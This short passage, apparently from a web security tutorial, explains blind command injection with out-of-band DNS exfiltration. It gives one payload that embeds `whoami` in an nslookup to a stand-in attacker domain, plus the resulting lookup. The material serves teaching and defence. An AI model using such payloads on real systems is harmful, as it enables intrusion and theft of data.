The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:

    '& nslookup `whoami`.kgji2ohoyw.web-attacker.com &'

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:

    'wwwuser.kgji2ohoyw.web-attacker.com'
